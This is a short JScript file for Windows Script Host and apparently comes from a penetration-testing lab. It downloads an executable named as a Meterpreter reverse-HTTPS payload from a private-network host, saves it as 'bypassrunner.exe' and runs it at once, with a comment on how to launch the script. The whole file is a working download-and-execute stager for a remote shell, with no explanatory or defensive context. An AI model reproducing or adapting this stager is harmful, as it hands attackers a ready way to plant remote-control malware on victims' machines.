var url = "http://10.0.0.234/temp_bin/windows_x64_meterpreter_reverse_https.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("bypassrunner.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("bypassrunner.exe");

// wscritp test.js